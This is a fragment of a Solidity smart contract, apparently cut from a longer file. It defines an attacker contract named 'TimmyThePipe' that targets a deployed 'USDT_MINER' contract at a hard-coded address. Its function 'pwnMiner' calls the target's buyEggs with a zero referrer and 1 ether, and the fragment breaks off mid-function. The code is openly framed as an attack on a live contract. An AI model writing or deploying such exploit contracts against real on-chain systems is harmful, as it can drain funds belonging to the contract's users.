...
contract TimmyThePipe {
    
  USDT_MINER public miner;

  constructor() {
      miner = USDT_MINER(0x118cc5A97BBDdEA917c22B17CDb1a792cd7Fc1dE);
  }
  
  function pwnMiner() public payable {
      // attack to the nearest ether
      //require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      miner.buyEggs(0x0000000000000000000000000000000000000000, 1 ether);
